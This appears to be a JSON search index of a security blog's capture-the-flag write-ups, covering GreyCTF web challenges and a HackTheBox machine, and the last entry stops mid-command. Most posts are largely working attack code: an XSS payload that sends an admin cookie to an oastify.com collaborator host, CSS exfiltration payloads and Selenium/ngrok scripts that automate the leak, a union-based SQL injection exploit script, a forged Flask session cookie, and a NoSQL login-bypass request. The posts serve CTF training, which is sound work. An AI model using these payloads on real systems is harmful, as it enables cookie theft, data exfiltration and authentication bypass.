[ { "title": "Oops", "url": "/posts/Oops/", "categories": "Web", "tags": "", "date": "2025-05-31 00:00:00 +0800", "snippet": "Source Code Analysisapp.py (Server) http://web-oops-app:5000/ @app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])def index(): message = None shortened_url = None if request.method == &#39;POST&#39;: original_url = request.form[&#39;original_url&#39;] url = original_url.lower() while &quot;script&quot; in url: url = url.replace(&quot;script&quot;, &quot;&quot;) # Generate unique short code while True: short_code = generate_short_code() conn = get_db_connection() existing = conn.execute(&#39;SELECT id FROM urls WHERE short_code = ?&#39;, (short_code,)).fetchone() if not existing: break conn.close() # Save to database conn = get_db_connection() conn.execute(&#39;INSERT INTO urls (original_url, short_code) VALUES (?, ?)&#39;, (original_url, short_code)) conn.commit() conn.close() shortened_url = request.host_url + short_code message = &quot;URL shortened successfully!&quot; return render_template(&quot;index.html&quot;, message=message, shortened_url=shortened_url) Receives the specified URL. Generates a 6 character alphanumeric string (short_code). Checks db to see if the short_code already exists, if its unique, break out of the loop. Inserts the original URL and the alphanumeric string into the db. Returns request.host_url + short_code. Not Vulnerable to SQLi Parameterized queries are used. User input is bound as data, not concatenated. Issues with the Code No validation, the server does not validate whether original_url is a properly formatted URL. No sanitization, original_url is inserted into the database without sanitization. @app.post(&#39;/report&#39;)def report(): submit_id = request.form[&quot;submit_id&quot;] submit_id = submit_id.split(&quot;/&quot;)[-1] s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((ADMIN_HOST, ADMIN_PORT)) s.sendall(submit_id.encode()) s.close() return render_template(&quot;index.html&quot;, report_message=&quot;Reported successfully.&quot;) Connects to web-oops-admin:3000. Splits the specified URL and store the path into submit_id. Send submit_id to the admin server at web-oops-admin:3000. The logic of the admin server web-oops-admin:3000 is the next section (bot.js) @app.route(&#39;/&amp;lt;short_code&amp;gt;&#39;)def redirect_url(short_code): conn = get_db_connection() url_data = conn.execute(&#39;SELECT original_url FROM urls WHERE short_code = ?&#39;, (short_code,)).fetchone() if url_data: # Increment click counter conn.execute(&#39;UPDATE urls SET clicks = clicks + 1 WHERE short_code = ?&#39;, (short_code,)) conn.commit() conn.close() return render_template(&quot;redir.html&quot;, url=url_data[&quot;original_url&quot;]), 200 else: conn.close() return render_template(&quot;not_found.html&quot;), 404 Retrieves the original_url from the database based on the user-supplied short_code. Renders the redir.html template, passing the unvalidated and unsanitized original_url as a template variable url. Flask (Jinja2) escapes HTML characters by default when rendering in HTML. &amp;lt;script&amp;gt; location.href = &quot;&quot;&amp;lt;/script&amp;gt; original_url is inserted inside &amp;lt;script&amp;gt; tags Vulnerable to XSS, here’s why location.href can be used to execute JS. Refer to this. The original URL is not sanitized before it is inserted into the DB. The original URL is partially sanitized (Only HTML characters are escaped) by Jinja2 when rendering redir.html. Dangerous JS characters such as ` not escaped. bot.js (Admin) web-oops-admin:3000 const visitSubmission = async (id) =&amp;gt; { if (!id.match(/^[0-9a-zA-Z]{6}$/)) { return } const browser = await getBrowser() const page = await browser.newPage() const hostname = new URL(BASE_URL).hostname await page.setCookie({ name: &#39;admin_flag&#39;, value: FLAG, domain: hostname, path: &#39;/&#39;, httpOnly: false, secure: false }) try { await page.goto(BASE_URL + id, { waitUntil: &#39;networkidle2&#39;, timeout: 5000 }) } catch (e) { console.log(e) } await page.close() returnBrowser(browser)} Checks if the argument id is a 6-character alphanumeric string. Initializes browser and page Obtains hostname based on http://web-oops-app:5000/ -&amp;gt; web-oops-app Sets a cookie with attributes critical to whether it will be sent on page visits. Visits the page and sends cookie depending whether the website qualifies for the cookie to be sent. Cookie Attribute Breakdown, Learn Here domain: hostname -&amp;gt; domain: web-oops-app Cookie will only be sent IF visiting website domain is web-oops-app, we can’t simply specify an arbitrary website for the bot to visit for e.g. x.oastify.com , otherwise the cookie will NOT be sent. path: / Cookie is sent for all paths (/ and anything under it). httpOnly: false Cookie can be accessed with JS, so we can do document.cookie. secure: false Cookie is sent even if visiting website is http This is only allowed if SameSite=Lax/Strict. SameSite: unset Defaults to Lax. const server = net.createServer((socket) =&amp;gt; { socket.on(&#39;data&#39;, async (data) =&amp;gt; { const id = data.toString() await visitSubmission(id) })}) Starts a server to receive submit_id from /report and trigger visitSubmission(id). TLDRAdmin Server (bot.js) Behavior bot.js script acts as an admin user, automatically visiting URLs reported through /report. Based on the implementation, the admin bot will only visit URLs hosted on http://web-oops-app:5000 AND Paths that match a 6-character alphanumeric string ([0-9a-zA-Z]{6}). URL Shortening and Redirection Logic User submits a POST request to http://web-oops-app:5000/. The server generates a random 6-character alphanumeric short_code, maps it to the submitted original_url. Inserts the mapping into the database. Returns the shortened URL, http://challs2.nusgreyhats.org:33001/ZT1ETj. User visits the shortened URL The server retrieves the original_url associated with the short_code from the database. The server renders redir.html, injecting the original_url into (view snippet below) &amp;lt;script&amp;gt; location.href = &quot;&quot; &amp;lt;/script&amp;gt; To solve Submit an XSS payload javascript:alert(document.cookie) instead of a normal URL. The server generates a random 6-character alphanumeric short_code, maps it to the submitted original_url (xss payload), inserts the mapping into the database, and returns the shortened URL The payload MUST NOT contain any HTML special characters (&quot;, &amp;lt;, &amp;gt;, &amp;amp;, &#39;). Report the shortened URL via the /report endpoint. Admin visits the shortened URL because it complies with the restrictions http://web-opps-app:5000 and the path matches the expected 6-character alphanumeric format. Server retrieves the original_url associated with the short_code from the database and renders it into redir.html. Flask returns &amp;lt;script&amp;gt;location.href=&quot;&amp;lt;original_url&amp;gt;&quot;&amp;lt;/script&amp;gt;. In this case it will be &amp;lt;script&amp;gt;location.href=&quot;javacsript:alert(document.cookie)&quot;&amp;lt;/script&amp;gt; The XSS payload is executed when the admin loads the page.Solve Verify that XSS is possible with an alert payload original_url=javascript:alert(1) Visit the shortened URL Replace the alert with a payload to exfiltrate cookies and verify it locally before proceeding. javascript:location.href=`https://k4psg6qqz7gqf2jspepvrpmgt7zynqlea.oastify.com/collect?c=${document.cookie}` Payload Worked ! It doesn’t use any HTML characters. httpOnly: false, the cookie is accessible via document.cookie and can be exfiltrated. We’re redirected to attacker’s server. Report the shortened URL. Admin visits the URL, XSS executes and redirects to the attacker’s site, appending the admin’s cookie as a GET parameter Solve Solver ~/labs/greyctf2025/ezpz/oops venv3 ❯ python3 solve.py --url http://192.168.150.135:33001 --webhook_url https://1y09ank7toa79jd9jvjcl6gxnotfh7iv7.oastify.com [+] shortened_url: http://192.168.150.135:33001/d6jJkf [+] check collaborator for flag " }, { "title": "Beautiful Styles", "url": "/posts/Beautiful-Styles/", "categories": "GreyCTF 2024, Web", "tags": "web/css/injection", "date": "2024-04-23 00:00:00 +0800", "snippet": "Challenge DescriptionI opened a contest to see who could create the most beautiful CSS styles. Feel free to submit your CSS styles to me and I will add them to my website to judge them. I’ll even give you a sample of my site to get you started. Flag only consists of numbers and uppercase letters and the lowercase character f (the exception is the flag format of grey{.+})Source Code Analysis&amp;lt;!DOCTYPE html&amp;gt;&amp;lt;html lang=&quot;en&quot;&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&quot;utf-8&quot; /&amp;gt; &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot; /&amp;gt; &amp;lt;title&amp;gt;My Beautiful Site&amp;lt;/title&amp;gt; &amp;lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; integrity=&quot;sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN&quot; crossorigin=&quot;anonymous&quot; /&amp;gt; &amp;lt;link href=&quot;/uploads/{{submit_id}}.css&quot; rel=&quot;stylesheet&quot; /&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;div class=&quot;container&quot;&amp;gt; &amp;lt;h1 id=&quot;title&quot;&amp;gt;Welcome to my beautiful site&amp;lt;/h1&amp;gt; &amp;lt;p id=&quot;sub-header&quot;&amp;gt; Here is some content that I want to share with you. An example can be this flag: &amp;lt;/p&amp;gt; &amp;lt;input id=&quot;flag&quot; value=&quot;{{ flag }}&quot; /&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;div class=&quot;container mt-4&quot;&amp;gt; &amp;lt;form action=&quot;/judge/{{submit_id}}&quot; method=&quot;post&quot;&amp;gt; &amp;lt;input type=&quot;submit&quot; value=&quot;Submit for judging&quot;&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js&quot; integrity=&quot;sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL&quot; crossorigin=&quot;anonymous&quot; &amp;gt;&amp;lt;/script&amp;gt; &amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt; Vulnerability Details:Refer to this Based on the challenge description, it is hinted that CSS exfiltration is possible, and we know the possible characters the flag contains. The flag is generated by a template engine, can be seen from {{ }} CSS exfiltration works by loading a background image from an external site when a specific variable value exists.” input[value^=&quot;a&quot;] {   color:red;   background:url(http://w52oa1fs4nbggxqy4mw7ydb15sbjz9ny.oastify.com)} For example, if the input element has a value that begins with a, the element will be red and the background image will be loaded, which will make a request to our burp collaboratorSolution Payload input[value^=&quot;grey{&quot;] { color:red; background:url(http://w52oa1fs4nbggxqy4mw7ydb15sbjz9ny.oastify.com) } Iterate through all uppercase letters + f and numbers Manual Semi-Auto Script Install requirements ┌──(root💀kali)-[~/…/ctf/greyCTF2024/WEB/Beautiful Styles] └─$ pip3 install selenium pyngrok Run script ┌──(root💀kali)-[~/…/ctf/greyCTF2024/WEB/Beautiful Styles] └─$ python3 semi_auto.py Demo Script Install geckdriverReleases · mozilla/geckodriver Install requirements ┌──(root💀kali)-[~/…/ctf/greyCTF2024/WEB/Beautiful Styles] └─$ pip3 install selenium pyngrok Run script ./geckodriver &amp;amp; ┌──(root💀kali)-[~/…/ctf/greyCTF2024/WEB/Beautiful Styles] └─$ export NGROK_AUTHTOKEN=x ┌──(root💀kali)-[~/…/ctf/greyCTF2024/WEB/Beautiful Styles] └─$ python3 auto.py Flag: grey{X5S34RCH1fY0UC4NF1ND1T} Demo CodeSemi Auto#!/usr/bin/python3# Remember to start geckodriver first /root/boxes/test/browser_automation/geckodriver &amp;amp;from selenium import webdriverfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.firefox.options import Optionsfrom selenium.webdriver.support.ui import WebDriverWaitfrom selenium.webdriver.support import expected_conditions as ECimport timeimport sysimport stringdef main(): valid_chars = string.ascii_uppercase + string.digits + &#39;f&#39; # Set the path to the location of geckodriver gecko_path = &#39;/root/boxes/test/browser_automation/geckodriver&#39; # Create FirefoxOptions and set the executable path firefox_options = Options() firefox_options.binary_location = gecko_path # Create a Firefox WebDriver instance driver = webdriver.Firefox(options=firefox_options) found = &quot;grey{&quot; while 1: for char in valid_chars: driver.get(&#39;http://challs.nusgreyhats.org:33339/&#39;) input_element = driver.find_element(By.ID, &quot;css-submit&quot;) input_element.send_keys(f&#39;input[value^=&quot;{found}{char}&quot;] {{ color: red; background: url(http://g5m8alfc47b0ghqi46wryxbl5cb3zxzlo.oastify.com/{char}); }}&#39;) submit_button = WebDriverWait(driver, 10).until( EC.presence_of_element_located((By.XPATH, &quot;//button[@type=&#39;submit&#39;]&quot;)) ) submit_button.click() # Wait for the new page or elements to load WebDriverWait(driver, 10).until( EC.presence_of_element_located((By.XPATH, &quot;//input[@type=&#39;submit&#39;]&quot;)) ) # Refind the button in the new page context submit_button2 = driver.find_element(By.XPATH, &quot;//input[@type=&#39;submit&#39;]&quot;) submit_button2.click() print(f&quot;Char: {char}&quot;) found_char = input(&quot;Enter found char: &quot;) if found_char == &quot;&quot;: break found += found_char print(f&quot;Flag: {found}&quot;) # Close the browserif __name__ == &#39;__main__&#39;: main()Auto#!/usr/bin/python3# Remember to start geckodriver first /root/boxes/test/browser_automation/geckodriver &amp;amp;import reimport threadingimport stringimport queueimport osfrom http.server import HTTPServer, BaseHTTPRequestHandlerfrom selenium import webdriverfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.firefox.options import Optionsfrom selenium.webdriver.support.ui import WebDriverWaitfrom selenium.webdriver.support import expected_conditions as ECfrom pyngrok import ngrokclass RequestHandler(BaseHTTPRequestHandler): def do_GET(self): data_queue.put(self.path) self.send_response(200) self.send_header(&#39;Content-type&#39;, &#39;text/html&#39;) self.end_headers() self.wfile.write(b&quot;Received&quot;) def log_message(self, format, *args): returnclass Listener(): def __init__(self, port): self.server = HTTPServer((&quot;0.0.0.0&quot;, port), RequestHandler) def start_listener(self): self.server.serve_forever() def stop_listener(self): self.server.shutdown()def extract_query_params(query_string): pattern = re.compile(r&#39;data=([^&amp;amp;=?]+)&#39;) match = pattern.search(query_string) if match: return match.group(1) else: return None def get_data(timeout=5): try: data = data_queue.get(timeout=timeout) value = extract_query_params(data) return value except queue.Empty: return Nonedata_queue = queue.Queue()def main(): valid_chars = string.ascii_uppercase + string.digits + &#39;f&#39; gecko_path = &#39;/root/boxes/test/browser_automation/geckodriver&#39; # Create FirefoxOptions and set the executable path firefox_options = Options() firefox_options.binary_location = gecko_path driver = webdriver.Firefox(options=firefox_options) listener = Listener(1337) listener_thread = threading.Thread(target=listener.start_listener, daemon=True) listener_thread.start() start_ngrok = ngrok.connect(1337, &quot;tcp&quot;) url = start_ngrok.public_url.replace(&quot;tcp://&quot;, &quot;http://&quot;) ngrok.set_auth_token(os.getenv(&quot;NGROK_AUTHTOKEN&quot;)) found = &quot;grey{&quot; while 1: for char in valid_chars: driver.get(&#39;http://challs.nusgreyhats.org:33339/&#39;) input_element = driver.find_element(By.ID, &quot;css-submit&quot;) input_element.send_keys(f&#39;input[value^=&quot;{found}{char}&quot;] {{ color: red; background: url({url}/?data={char}); }}&#39;) submit_button = WebDriverWait(driver, 10).until( EC.presence_of_element_located((By.XPATH, &quot;//button[@type=&#39;submit&#39;]&quot;)) ) submit_button.click() # Wait for the new page or elements to load WebDriverWait(driver, 10).until( EC.presence_of_element_located((By.XPATH, &quot;//input[@type=&#39;submit&#39;]&quot;)) ) # Refind the button in the new page context submit_button2 = driver.find_element(By.XPATH, &quot;//input[@type=&#39;submit&#39;]&quot;) submit_button2.click() print(f&quot;Building Flag: {found}{char}&quot;, end=&#39;\\r&#39;, flush=True) found_char = get_data() if found_char: found += found_char else: found += &#39;}&#39; break print(&quot; &quot; * 150, end=&#39;\\r&#39;) print(f&quot;Flag: {found}&quot;) listener.stop_listener() listener_thread.join() ngrok.disconnect(start_ngrok.public_url)if __name__ == &#39;__main__&#39;: main()" }, { "title": "Markdown Parser", "url": "/posts/Markdown-Parser/", "categories": "Web", "tags": "web/xss", "date": "2024-04-21 00:00:00 +0800", "snippet": "Source Code Analysis markdown.js function parseMarkdown(markdownText) { const lines = markdownText.split(&#39;\\n&#39;); let htmlOutput = &quot;&quot;; let inCodeBlock = false; lines.forEach(line =&amp;gt; { if (inCodeBlock) { if (line.startsWith(&#39;```&#39;)) { inCodeBlock = false; htmlOutput += &#39;&amp;lt;/code&amp;gt;&amp;lt;/pre&amp;gt;&#39;; } else { htmlOutput += escapeHtml(line) + &#39;\\n&#39;; } } else { if (line.startsWith(&#39;```&#39;)) { language = line.substring(3).trim(); inCodeBlock = true; // add class to code block for syntax highlighting htmlOutput += &#39;&amp;lt;pre&amp;gt;&amp;lt;code class=&quot;language-&#39; + language + &#39;&quot;&amp;gt;&#39;; } else { line = escapeHtml(line); line = line.replace(/`(.*?)`/g, &#39;&amp;lt;code&amp;gt;$1&amp;lt;/code&amp;gt;&#39;); Vulnerability Details: It is possible to inject XSS code on the same line as the triple backtick In markdown the triple backticks, is used to start a code block. After the 3 backticks, it is used to declare the language that resides in the code block. Since no input sanitization is done, we can inject xss there Solution " }, { "title": "Grey CTF Survey", "url": "/posts/Grey-CTF-Survey/", "categories": "GreyCTF 2024, Web", "tags": "js/parseInt", "date": "2024-04-20 00:00:00 +0800", "snippet": "Source Code Analysisapp.post(&#39;/vote&#39;, async (req, res) =&amp;gt; { const {vote} = req.body; if(typeof vote != &#39;number&#39;) { return res.status(400).json({ &quot;error&quot;: true, &quot;msg&quot;:&quot;Vote must be a number&quot; }); } if(vote &amp;lt; 1 &amp;amp;&amp;amp; vote &amp;gt; -1) { score += parseInt(vote); if(score &amp;gt; 1) { score = -0.42069; return res.status(200).json({ &quot;error&quot;: false, &quot;msg&quot;: config.flag, }); } return res.status(200).json({ &quot;error&quot;: false, &quot;data&quot;: score, &quot;msg&quot;: &quot;Vote submitted successfully&quot; }); } else { return res.status(400).json({ &quot;error&quot;: true, &quot;msg&quot;:&quot;Invalid vote&quot; }); }}) Vulnerability Details:Solving a Mystery Behavior of parseInt() in JavaScript User input, an integer is passed into parseInt(), causing an unexpected value. When an integer is passed into parseInt() it is converted to a string then into an integer again, if a number gets too large/small, “Scientific Notation” is used So 0.0000005 turns into 5e-7 (String) and then 5 (int) String(0.5); // =&amp;gt; &#39;0.5&#39; String(0.05); // =&amp;gt; &#39;0.05&#39; String(0.005); // =&amp;gt; &#39;0.005&#39; String(0.0005); // =&amp;gt; &#39;0.0005&#39; String(0.00005); // =&amp;gt; &#39;0.00005&#39; String(0.000005); // =&amp;gt; &#39;0.000005&#39; String(0.0000005); // =&amp;gt; &#39;5e-7&#39; =&amp;gt; 5Solution┌──(root💀kali)-[~/boxes/nusgreyhat/WEB/Grey CTF Survey]└─$ curl -H &quot;Content-Type: application/json&quot; -d &#39;{&quot;vote&quot;:0.0000005}&#39; http://challs.nusgreyhats.org:33334/vote{&quot;error&quot;:false,&quot;msg&quot;:&quot;grey{50m371m35_4_l177l3_6035_4_l0n6_w4y}&quot;} " }, { "title": "Fearless Concurrency", "url": "/posts/Fearless-Concurrency/", "categories": "GreyCTF 2024, Web", "tags": "rust, web/mysqli/union-based", "date": "2024-04-20 00:00:00 +0800", "snippet": "Source Code Analysisasync fn query(State(state): State&amp;lt;AppState&amp;gt;, Json(body): Json&amp;lt;Query&amp;gt;) -&amp;gt; axum::response::Result&amp;lt;String&amp;gt; { let users = state.users.read().await; let user = users.get(&amp;amp;body.user_id).ok_or_else(|| &quot;User not found! Register first!&quot;)?; let user = user.clone(); // Prevent registrations from being blocked while query is running // Fearless concurrency :tm: drop(users); // Prevent concurrent access to the database! // Don&#39;t even try any race condition thingies // They don&#39;t exist in rust! let _lock = user.lock.lock().await; let mut conn = state.pool.get_conn().await.map_err(|_| &quot;Failed to acquire connection&quot;)?; // Unguessable table name (requires knowledge of user id and random table id) let table_id = rand::random::&amp;lt;u32&amp;gt;(); let mut hasher = Sha1::new(); hasher.update(b&quot;fearless_concurrency&quot;); hasher.update(body.user_id.to_le_bytes()); let table_name = format!(&quot;tbl_{}_{}&quot;, hex::encode(hasher.finalize()), table_id); let table_name = dbg!(table_name); let qs = dbg!(body.query_string); // Create temporary, unguessable table to store user secret conn.exec_drop( format!(&quot;CREATE TABLE {} (secret int unsigned)&quot;, table_name), () ).await.map_err(|_| &quot;Failed to create table&quot;)?; conn.exec_drop( format!(&quot;INSERT INTO {} values ({})&quot;, table_name, user.secret), () ).await.map_err(|_| &quot;Failed to insert secret&quot;)?; // Secret can&#39;t be leaked here since table name is unguessable! let res = conn.exec_first::&amp;lt;String, _, _&amp;gt;( format!(&quot;SELECT * FROM info WHERE body LIKE &#39;{}&#39;&quot;, qs), () ).await; // You&#39;ll never get the secret! conn.exec_drop( format!(&quot;DROP TABLE {}&quot;, table_name), () ).await.map_err(|_| &quot;Failed to drop table&quot;)?; let res = res.map_err(|_| &quot;Failed to run query&quot;)?; // _lock is automatically dropped when function exits, releasing the user lock if let Some(result) = res { return Ok(result); } Ok(String::from(&quot;No results!&quot;))}Line 17-21: We can figure out the table name partially, table_{&amp;lt;here&amp;gt;}_{}, since its taken from user_id (plaintext) and the string fearless_concurrency (salt) user_id is returned when a user is registered Line 37-40: Susceptible to SQLi due to lack of input sanitizationLine 27-47: A table (we know the name) is created and user secret is inserted, A pointless query can be made (vulnerable to sqli), pointless since we are just retrieving Hello World! Table is droppedSolution Register 2 users, dummy_id, user_id user_id is used to sleep MySQL (so that table is not deleted) and retrieve the Flag dummy_id is used to leak the full table name (tbl_{}_{}) and user_secret Inject a sleep statement with uid1 Retrieve full table name using SQL LIKE operator with uid2 Retrieve secret with uid2 Retrieve flag with uid1Manual Create 2 users ┌──(root💀kali)-[~/…/ctf/greyCTF2024/WEB/Fearless Concurrency] └─$ curl -X POST http://challs.nusgreyhats.org:33333/register 15428637266543480840 ┌──(root💀kali)-[~/…/ctf/greyCTF2024/WEB/Fearless Concurrency] └─$ curl -X POST http://challs.nusgreyhats.org:33333/register 14423584875232163462 Generate partial table name In [1]: import hashlib In [2]: def get_hash(user_id): ...: hasher = hashlib.sha1() ...: hasher.update(b&#39;fearless_concurrency&#39;) ...: hasher.update(user_id.to_bytes((user_id.bit_length() + 7) // 8, byteorder=&#39;little&#39;)) ...: table_prefix = f&quot;tbl_{hasher.hexdigest()}&quot; ...: return table_prefix ...: In [3]: get_hash(15428637266543480840) Out[3]: &#39;tbl_574d112d2ed97edd59f7bd3880291ac45ffa8c2a&#39; Inject Sleep ┌──(root💀kali)-[~/…/ctf/greyCTF2024/WEB/Fearless Concurrency] └─$ cat json/sleep.json {&quot;user_id&quot;:15428637266543480840,&quot;query_string&quot;:&quot;&#39; UNION SELECT (SELECT SLEEP(30))-- -&quot;} ┌──(root💀kali)-[~/…/ctf/greyCTF2024/WEB/Fearless Concurrency] └─$ curl -s -H &quot;Content-Type: application/json&quot; http://challs.nusgreyhats.org:33333/query -d @&quot;json/sleep.json&quot; Extract full table name {&quot;user_id&quot;:14423584875232163462,&quot;query_string&quot;:&quot;&#39; UNION SELECT (SELECT table_name FROM information_schema.tables WHERE table_name LIKE &#39;tbl_574d112d2ed97edd59f7bd3880291ac45ffa8c2a%&#39;)-- -&quot;} ┌──(root💀kali)-[~/…/ctf/greyCTF2024/WEB/Fearless Concurrency] └─$ curl -s -H &quot;Content-Type: application/json&quot; http://challs.nusgreyhats.org:33333/query -d @&quot;json/get_table_name.json&quot; tbl_278a4fc337ddc0a24dd40a34d5e7f0f48d2ff6e1_1913583239 Extract secret {&quot;user_id&quot;:14423584875232163462,&quot;query_string&quot;:&quot;&#39; UNION SELECT (SELECT * FROM tbl_574d112d2ed97edd59f7bd3880291ac45ffa8c2a_3680590309)-- -&quot;} ┌──(root💀kali)-[~/…/ctf/greyCTF2024/WEB/Fearless Concurrency] └─$ curl -s -H &quot;Content-Type: application/json&quot; http://challs.nusgreyhats.org:33333/query -d @&quot;json/get_secret.json&quot; 2026828775 Get Flag {&quot;user_id&quot;:15428637266543480840,&quot;secret&quot;:1679592540} ┌──(root💀kali)-[~/…/ctf/greyCTF2024/WEB/Fearless Concurrency] └─$ curl -s -H &quot;Content-Type: application/json&quot; http://challs.nusgreyhats.org:33333/flag -d @&quot;json/get_flag.json&quot; grey{ru57_c4n7_pr3v3n7_l061c_3rr0r5} Demo Auto Run script ┌──(root💀kali)-[~/…/ctf/greyCTF2024/WEB/Fearless Concurrency] └─$ python3 test.py [*] registered user 1 [*] registered user 2 [*] injecting sleep [*] extracting table, secret and flag [*] retrieved table name: tbl_17d6277119176dd65f3673d9718b80e8fa2a9f8b_3690022472 [*] retrieved secret: 2527089681 [*] retrieved flag: grey{ru57_c4n7_pr3v3n7_l061c_3rr0r5} [*] slept Demo Codeimport requestsimport threadingimport timeimport hashlib#proxies = {&#39;http&#39;: &#39;http://127.0.0.1:8080&#39;}URL = &quot;http://challs.nusgreyhats.org:33333&quot;def get_hash(user_id): hasher = hashlib.sha1() hasher.update(b&#39;fearless_concurrency&#39;) hasher.update(user_id.to_bytes((user_id.bit_length() + 7) // 8, byteorder=&#39;little&#39;)) table_prefix = f&quot;tbl_{hasher.hexdigest()}&quot; return table_prefix def register(): url = &quot;http://challs.nusgreyhats.org:33333/register&quot; r = requests.post(url) return int(r.text)def sleeper(user_id): try: json = {&quot;query_string&quot;: &quot;&#39; UNION SELECT SLEEP(15)-- -&quot;, &quot;user_id&quot;: user_id} r = requests.post(f&quot;{URL}/query&quot;, json=json) print(&quot;[*] slept&quot;) except requests.exceptions.Timeout: print(&quot;request timeout occurred.&quot;) def get_table(user_id, dummy_user_id): json = {&quot;query_string&quot;: f&quot;&#39; UNION SELECT (SELECT table_name FROM information_schema.tables WHERE table_name LIKE &#39;{get_hash(user_id)}%&#39;)-- -&quot;, &quot;user_id&quot;: dummy_user_id} r = requests.post(f&quot;{URL}/query&quot;, json=json) print(f&quot;[*] retrieved table name: {r.text}&quot;) return r.textdef get_secret(dummy_user_id, table_name): json = {&quot;query_string&quot;: f&quot;&#39; UNION SELECT (SELECT * FROM {table_name})-- -&quot;, &quot;user_id&quot;: dummy_user_id} r = requests.post(f&quot;{URL}/query&quot;, json=json) print(f&quot;[*] retrieved secret: {r.text}&quot;) return int(r.text)def get_flag(user_id, secret): json = {&quot;secret&quot;: secret, &quot;user_id&quot;: user_id} r = requests.post(f&quot;{URL}/flag&quot;, json=json) print(f&quot;[*] retrieved flag: {r.text}&quot;) return r.textdef main(): dummy_user_id = register() print(f&quot;[*] registered user 1&quot;) user_id = register() print(f&quot;[*] registered user 2&quot;) print(f&quot;[*] injecting sleep&quot;) sleeper_thread = threading.Thread(target=sleeper, args=(user_id,)) sleeper_thread.start() print(f&quot;[*] extracting table, secret and flag&quot;) table_name = get_table(user_id, dummy_user_id) secret = get_secret(dummy_user_id, table_name) flag = get_flag(user_id, secret) sleeper_thread.join()if __name__ == &quot;__main__&quot;: main()Failed AttemptsInstead of trying to extract the full name of the table, tried to exfiltrate all the tables, store them in a list and iterate through all of them to get their secrets and then the flags.After sleeping the MySQL db and then querying for all the tables, the new table (created cuz of the query) isn’t displayed. " }, { "title": "Baby Web", "url": "/posts/Baby-Web/", "categories": "GreyCTF 2024, Web", "tags": "python/flask", "date": "2024-04-20 00:00:00 +0800", "snippet": "Source Code Analysisimport osfrom flask import Flask, render_template, sessionapp = Flask(__name__)app.secret_key = &quot;baby-web&quot;FLAG = os.getenv(&quot;FLAG&quot;, r&quot;grey{fake_flag}&quot;)@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])def index(): # Set session if not found if &quot;is_admin&quot; not in session: session[&quot;is_admin&quot;] = False return render_template(&quot;index.html&quot;)@app.route(&quot;/admin&quot;)def admin(): # Check if the user is admin through cookies return render_template(&quot;admin.html&quot;, flag=FLAG, is_admin=session.get(&quot;is_admin&quot;))### Some other hidden code ###if __name__ == &quot;__main__&quot;: app.run(debug=True) Flask secret is givenSolution Generate token with secret ┌──(venv3)─(root💀kali)-[~/boxes/nusgreyhat/WEB/Baby Web] └─$ flask-unsign --sign --secret baby-web --cookie &quot;{&#39;is_admin&#39;: True}&quot; eyJpc19hZG1pbiI6dHJ1ZX0.ZiNXFw.WRsAhM4YuAbaSdsKlkG6EXWZFrU Get Flag ┌──(root💀kali)-[~/…/ctf/greyCTF2024/WEB/Fearless Concurrency] └─$ curl -H &quot;Cookie: session=eyJpc19hZG1pbiI6dHJ1ZX0.ZiNXFw.WRsAhM4YuAbaSdsKlkG6EXWZFrU&quot; http://challs.nusgreyhats.org:33338/flag Here is your flag: &amp;lt;code&amp;gt;grey{0h_n0_mY_5up3r_53cr3t_4dm1n_fl4g}&amp;lt;/code&amp;gt; " }, { "title": "HackTheBox - Stocker", "url": "/posts/Stocker/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "xss, lfi, nosqli, wildcard, node, pdf", "date": "2023-06-10 00:00:00 +0800", "snippet": "OverviewMachine begins with a subdomain enumeration, discovering dev.stocker.htb, where it is susceptible to a NoSQLi login bypass. Exploiting this vulnerability granted access to the cart checkout page, which was found to be vulnerable to a cross-site scripting to local file inclusion (XSS2LFI) attack. By leveraging the XSS vulnerability, it was possible to perform local file inclusion (LFI) and gain access to the index.js file, which contained credentials for the user angoose.Next, it was observed that the user angoose possessed the privilege to execute the command sudo /usr/bin/node /usr/local/scripts/*.js. The usage of the wildcard (*) in the command created a vulnerability that allowed for directory traversal, enabling the execution of a malicious payload. privilege escalating us to root. Column Details Box Name Stocker IP 10.10.11.196 Points 20 Difficulty Easy Creator JoshSH Release Date 14 Jan 2023 ReconTCP/80 (HTTP) FFUF Could not enumerate any interesting files Enumerate for subdomains ┌──(root💀kali)-[~/htb/stocker] └─# ffuf -u http://stocker.htb -H &quot;Host: FUZZ.stocker.htb&quot; -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fc 301 dev [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 249ms] dev.stocker.htb - add it to your /etc/hosts Initial FootholdTCP/80 (HTTP) - NoSQLi Proceed to http://dev.stocker.htb, found a login page With webappalyzer found that page is running on node.js Since it is node.js , we can try NoSQLi NoSQLi worked # Payload POST /login HTTP/1.0 Host: dev.stocker.htb User-Agent: Mozilla/5.0 (Hydra Proxy) Content-Length: 59 Content-Type: application/json Cookie: connect.sid=s%3AqAR-6lAK22yFu_5EbRGEq3zlLw0ch7dB.fQcRonylfrEFjjkKqs6H6wQgHouF%2FBB7btxpEfskgbA Connection: close {&quot;username&quot;: {&quot;$ne&quot;: null}, &quot;password&quot;: {&quot;$ne&quot;: null} } Change content type to application/json Demo - NoSQLi Web directory /var/www/dev/ TCP/80 - XSS2LFI Add items to cart and checkout, intercept w/ burp There are a lot of parameters that could be vulnerable, we’ll have to try them one by one Download the purchase order to look at the metadata w/ exiftool ┌──(root💀kali)-[~/htb/stocker/10.10.11.196/exploit] └─# 